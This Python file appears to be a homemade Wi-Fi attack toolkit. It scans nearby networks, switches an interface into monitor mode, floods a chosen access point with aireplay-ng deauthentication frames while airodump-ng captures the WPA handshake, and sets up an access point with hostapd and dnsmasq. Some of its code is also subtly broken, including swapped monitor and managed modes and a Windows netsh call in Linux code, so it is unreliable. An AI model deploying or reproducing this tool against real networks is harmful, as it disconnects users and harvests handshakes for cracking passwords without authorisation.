
import subprocess, json, re, sys, logging, time, os

import psutil, aioserial, pywifi
from gpiozero import CPUTemperature
import asyncio



logger = logging.getLogger()
logger.addHandler(logging.StreamHandler(sys.stdout))
logger.setLevel(logging.DEBUG)

logging.getLogger("pywifi").setLevel(logging.WARNING)
wifi = pywifi.PyWiFi()
interface = 0
iface = wifi.interfaces()[int(interface)]

def __installNeeded__():
    try:
        # Run the installation command
        subprocess.run(["sudo", "apt-get", "install", "hostapd", "dnsmasq", "aircrack-ng"], check=True)
        return {"status": "success", "message": "Packages installed successfully"}
    except subprocess.CalledProcessError as e:
        return {"status": "error", "message": f"Error during package installation: {e}", "error": str(e)}
    except Exception as e:
        return {"status": "error", "message": f"An unexpected error occurred: {e}", "error": str(e)}
    


async def getGPSData(GPSinterface: int = 0):
    ser = aioserial.AioSerial(
        port=f'/dev/{GPSinterface}',
        baudrate=9600,
        parity=aioserial.PARITY_NONE,
        stopbits=aioserial.STOPBITS_ONE,
        bytesize=aioserial.EIGHTBITS,
        timeout=1,
    )

    while True:
        try:
            line = await ser.readline()
            decoded_line = line.decode()  # Decode bytes to string
            logger.debug(decoded_line)
            print(decoded_line)
            # Parse the NMEA sentence and create a dictionary
            #gps_data = PHARSE TO JSON HERE
            
            # Convert the dictionary to JSON and print it
            #json_data = json.dumps(gps_data)
            #print(json_data)
        except aioserial.SerialException as e:
            logger.error(f'SerialException: {e}')
            break
        except UnicodeDecodeError as e:
            logger.error(f'UnicodeDecodeError: {e}')
        continue

    
def checkMonitorModeSupport(interface_name: str):
    try:
        # Run the 'iw list' command to get information about the interface
        iw_output = subprocess.check_output(['iw', 'list', interface_name], stderr=subprocess.STDOUT, text=True)

        # Use regular expressions to check for monitor mode support
        if re.search(r"Monitor", iw_output):
            return True
        else:
            return False

    except subprocess.CalledProcessError:
        # The 'iw' command failed, which may mean the interface does not exist
        return False
    
    

def showInterfaces() -> json:
	interfaces = wifi.interfaces()
	interfacesJson = {}
	for idx, iface in enumerate(interfaces):
		interfacesJson[idx] = {"idx": idx, "interfaceName": iface.name()}
	return interfacesJson


# here we have to pass in helper obj bc of pussy parent package shit
async def dumpAndStore(interfaceIDX: int = 0, helpersObj: object = None):
	#try:
	
	# Scan for WLAN networks
    iface.scan()
    await asyncio.sleep(5)  # Sleep for 5 seconds before the next iteration
	# Get the scan results
    scan_results = iface.scan_results()
    # Create a list to store the scan result data
    scan_data = {}
    for result in scan_results:
        frequency = result.freq / 1000  # Convert frequency to MHz
        if 2400 <= frequency <= 2500:
            # 2.4 GHz band
            channel = (frequency - 2400) / 5 + 1
            band = "2.4 GHz"
        elif 5000 <= frequency <= 6000:
            # 5 GHz band
            channel = (frequency - 5000) / 5 + 36
            band = "5 GHz"
        else:
            band = "Unknown"

        scan_data[result.ssid] = {
            "SSID": result.ssid,
            "Signal_Strength": result.signal,
            "BSSID": result.bssid.upper()[:-1],
            "akm": result.akm,
            "auth": result.auth,
            "freq": result.freq,
            "channel": int(channel),
            "band": band
        }


    await helpersObj.database().writeToDB("scanResults", scan_data)


	#except Exception as e:
	#	print(f"Error in dumpAndStore: {str(e)}")
	#	await asyncio.sleep(5)  # Sleep for 5 seconds before the next iteration





def getInterfaceUsage(interface: int) -> dict:
	def get_size(bytes):
		"""
		Returns size of bytes in a nice format
		"""
		for unit in ['', 'K', 'M', 'G', 'T', 'P']:
			if bytes < 1024:
				return f"{bytes:.2f}{unit}B"
			bytes /= 1024

	# Define bytes_sent and bytes_recv
	bytes_sent = 0  # Initial value
	bytes_recv = 0  # Initial value

	# Get the stats again
	io_2 = psutil.net_io_counters()

	# Calculate the difference in bytes sent and received
	us, ds = io_2.bytes_sent - bytes_sent, io_2.bytes_recv - bytes_recv

	# Update the bytes_sent and bytes_recv for the next iteration
	bytes_sent, bytes_recv = io_2.bytes_sent, io_2.bytes_recv

	# Return the interface usage as a dictionary
	return {"upload": get_size(us), "download": get_size(ds)}



def get_cpu_temperature():
	try:
		temperatures = CPUTemperature().temperature
		return round(temperatures)
	except Exception as e:
		print(f"Error fetching CPU temperature: {e}")
		return None
def get_cpu_usage():
	try:
		usage = round(psutil.cpu_percent(interval=1)) # Interval is in seconds
		if usage <= 70:
			return [usage, "Normal"]
		elif usage > 70 and usage <= 80:
			return [usage, "Critical"]
	except Exception as e:
		print(f"Error fetching CPU usage: {e}")
		return {"status": "error", "message": "Error fetching CPU usage", "error": str(e)}



def setupAP(interface:int=0):
	hostapd_config = f"""/
interface={interface}
ssid=superSecretNetwork
hw_mode=g
channel=6
		"""

	dnsmasq_config = f"""/
interface={interface}
dhcp-range=10.0.0.2,10.0.0.240,255.255.255.0,6h
domain-needed
bogus-priv
filterwin2k
server=1.1.1.1
listen-address=0.0.0.0
no-hosts
log-dhcp
port=53
		"""
	autoIP = f"""/

allow-hotplug {interface}
iface {interface} inet static
    address 10.0.0.1
    netmask 255.255.255.0
"""


	with open("/etc/hostapd/hostapd.conf", "a") as f:
		f.write(hostapd_config)
	with open("/etc/dnsmasq/dnsmasq.conf", "a") as f:
		f.write(dnsmasq_config)
	with open("/etc/network/interfaces", "a") as f:
		f.write(autoIP)

	subprocess.run(["sudo", "systemctl", "unmask", "hostapd.service", "dnsmasq.service"])
	subprocess.run(["sudo", "systemctl", "enable", "hostapd.service", "dnsmasq.service"])
	subprocess.run(["sudo", "systemctl", "start", "hostapd.service", "dnsmasq.service"])
	subprocess.run(["sudo", "ifconfig", interface, "up"])
	print("Access point setup complete, you may need to reboot for changes to take effect")











async def getInterfaceMode(interface_name):
	try:
		result = subprocess.run(["iwconfig", interface_name], capture_output=True, text=True, check=True)
		output_lines = result.stdout.splitlines()
		for line in output_lines:
			if "Mode:" in line:
				mode = line.split("Mode:")[1].split()[0]
				return mode.lower()
		return "Unknown"
	except subprocess.CalledProcessError as e:
		print("Error getting interface mode:", e)
		return "Error"

 


async def listenForHandshakes(interface: str, bssid: str, timeout: int = 15):
    try:
        print("listening for handshake started")
        available = subprocess.check_output('netsh wlan show network mode=bssid',stderr=subprocess.STDOUT,universal_newlines=True,shell=True)
        # Define the airodump-ng command to capture handshakes
        output_filename = f"Utils/handshakes/handshake_{bssid}.cap"  # Define the output filename
        airodump_command = [
            "sudo", "airodump-ng", "--bssid", bssid, "--write", output_filename, interface
        ]
        
        # Start the airodump-ng process
        airodump_process = await asyncio.create_subprocess_exec(
            *airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        # Wait for the process to complete or timeout
        try:
            await asyncio.wait_for(airodump_process.wait(), timeout=timeout)
        except asyncio.TimeoutError:
            # Handle timeout
            airodump_process.terminate()
            return {"status": "error", "message": "Listening for handshakes timed out"}

        # Check the return code to see if the process was successful
        return_code = await airodump_process.returncode
        if return_code == 0:
            return {"status": "success", "message": f"Handshake captured and saved as {output_filename}"}
        else:
            return {"status": "error", "message": "Listening for handshakes failed"}

    except subprocess.CalledProcessError as e:
        return {"status": "error", "message": "Error running airodump-ng", "error": str(e)}
    except Exception as e:
        return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}



async def deauthenticateNetwork(interface: str, bssid: str, timeout: int = 10, frames: int = 10):
    try:
        print("deauthing network started")
        # Define the aireplay-ng command for deauthentication
        deauth_command = [
            "sudo", "aireplay-ng", "--deauth", frames,  
            "-a", bssid, interface
        ]
        
        # Start the aireplay-ng process
        deauth_process = await asyncio.create_subprocess_exec(
            *deauth_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        # Wait for the process to complete or timeout
        try:
            await asyncio.wait_for(deauth_process.wait(), timeout=timeout)
        except asyncio.TimeoutError:
            # Handle timeout
            deauth_process.terminate()
            return {"status": "error", "message": "Deauthentication timed out"}

        # Check the return code to see if the process was successful
        return_code = await deauth_process.returncode
        if return_code == 0:
            return {"status": "success", "message": "Deauthentication sent successfully"}
        else:
            return {"status": "error", "message": "Deauthentication failed"}

    except subprocess.CalledProcessError as e:
        return {"status": "error", "message": "Error running aireplay-ng", "error": str(e)}
    except Exception as e:
        return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}


# ok yes this part is chatgpt but hey this part was hard gimmie a break🤓
async def captureHandshake(interface: str, bssid: str, timeout: int = 10):
    try:
        # YES it ends here, these are the last to sub calls to listen and capture the handshake hopefully lmao
        
        listening_task = asyncio.create_task(listenForHandshakes(interface, bssid))
        deauth_task = asyncio.create_task(deauthenticateNetwork(interface, bssid, timeout))

        # Wait for either task to complete
        done, _ = await asyncio.wait([listening_task, deauth_task], return_when=asyncio.FIRST_COMPLETED)

        # Cancel the other task
        for task in done:
            print("task done => ", task)
            if task == listening_task:
                deauth_task.cancel()
            else:
                listening_task.cancel()

        # Determine which task completed
        if listening_task.done() and listening_task.result():
            return listening_task.result()
        elif deauth_task.done() and deauth_task.result():
            return deauth_task.result()

        return {"status": "error", "message": "Both tasks failed to complete"}

    except asyncio.CancelledError:
        return {"status": "error", "message": "Task was cancelled"}
    except subprocess.CalledProcessError as e:
        return {"status": "error", "message": "Error running airodump-ng", "error": str(e)}
    except Exception as e:
        return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}



# Every time you call, it will update the interface mode (monitor / managed)
async def configInterface(interface: str, mode: str):
	try:
		if mode.lower() == "managed":
			commands = [
		        ["sudo", "ifconfig", interface, "down"],
		        ["sudo", "iwconfig", interface, "mode", "monitor"],
		        ["sudo", "ifconfig", interface, "up"],
		    ]
		elif mode.lower() == "monitor":
			commands = [
		        ["sudo", "ifconfig", interface, "down"],
		        ["sudo", "iwconfig", interface, "mode", "managed"],
		        ["sudo", "ifconfig", interface, "up"],
		    ]
		else:
			return {"status": "error", "message": "Invalid mode"}
		for cmd in commands:
			subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
		
		return {"status": "success", "message": f"Interface changed to {mode} mode"}
	except subprocess.CalledProcessError as e:
		return {"status": "error", "message": f"Error changing interface to {mode} mode", "error": str(e)}
	except Exception as e:
		return {"status": "error", "message": f"An unexpected error occurred", "error": str(e)}

